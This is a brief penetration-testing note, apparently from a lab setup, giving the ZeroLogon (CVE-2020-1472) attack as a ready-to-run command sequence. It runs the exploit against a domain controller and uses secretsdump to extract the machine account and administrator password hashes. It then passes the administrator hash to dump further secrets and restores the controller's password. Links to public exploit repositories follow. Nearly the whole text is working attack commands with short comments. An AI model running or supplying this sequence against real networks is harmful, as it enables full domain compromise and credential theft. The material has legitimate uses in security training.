# ZeroLogon

```
python3 cve-2020-1472-exploit.py HYDRA-DC 192.168.181.130 # run exploit

# check if it worked
secretsdump.py -just-dc MARVEL/HYDRA-DC\$@192.168.181.130
# copy administrator hash and use it with secrets dump
secretsdump.py administrator@192.168.181.130 -hashes <Hash>
# copy plain password hex value

# restore password
python3 restorepassword.py MARVEL/HYDRA-dc@HYDRA-DC -target-ip 192.168.181.130 -hexpass <hex pass>
```

---
Tags: #AD #zerologon #cve-2020-1472
Resources:
https://www.trendmicro.com/en_us/what-is/zerologon.html
https://github.com/dirkjanm/CVE-2020-1472
https://github.com/SecuraBV/CVE-2020-1472

